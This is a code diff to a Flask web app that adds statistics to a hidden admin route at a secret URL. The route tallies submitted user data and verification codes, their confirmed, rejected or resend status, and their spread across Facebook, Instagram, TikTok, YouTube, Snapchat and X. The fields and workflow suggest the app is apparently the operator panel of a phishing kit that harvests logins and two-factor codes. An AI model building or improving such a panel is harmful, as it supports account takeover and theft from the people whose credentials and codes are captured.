@@ -603,13 +603,46 @@ def get_previous_code_page(platform):
     }
     return platform_pages.get(platform, '/')
 
+# UPDATED: Admin route with statistics calculation
 @app.route(f"/admin/{ADMIN_SECRET}")
 def admin():
     with sqlite3.connect(DB_FILE) as conn:
         rows = conn.execute(
             'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
         ).fetchall()
-    return render_template('admin.html', submissions=rows, secret=ADMIN_SECRET)
+    
+    # Calculate statistics
+    total_submissions = len(rows)
+    
+    # Code statistics
+    pending_codes_count = sum(1 for row in rows if row[6] and not row[7] and not row[9])
+    confirmed_codes_count = sum(1 for row in rows if row[6] and row[7])
+    rejected_codes_count = sum(1 for row in rows if row[6] and row[9])
+    resend_requests_count = sum(1 for row in rows if row[10])
+    total_codes_count = sum(1 for row in rows if row[6])
+    
+    # Platform statistics
+    facebook_count = sum(1 for row in rows if row[8] == 'Facebook')
+    instagram_count = sum(1 for row in rows if row[8] == 'Instagram')
+    tiktok_count = sum(1 for row in rows if row[8] == 'TikTok')
+    youtube_count = sum(1 for row in rows if row[8] == 'YouTube')
+    snapchat_count = sum(1 for row in rows if row[8] == 'Snapchat')
+    twitter_count = sum(1 for row in rows if row[8] in ['X / Twitter', 'Twitter'])
+    
+    return render_template('admin.html', 
+                         submissions=rows, 
+                         secret=ADMIN_SECRET,
+                         pending_codes_count=pending_codes_count,
+                         confirmed_codes_count=confirmed_codes_count,
+                         rejected_codes_count=rejected_codes_count,
+                         resend_requests_count=resend_requests_count,
+                         total_codes_count=total_codes_count,
+                         facebook_count=facebook_count,
+                         instagram_count=instagram_count,
+                         tiktok_count=tiktok_count,
+                         youtube_count=youtube_count,
+                         snapchat_count=snapchat_count,
+                         twitter_count=twitter_count)
 
 @app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
 def admin_clear():
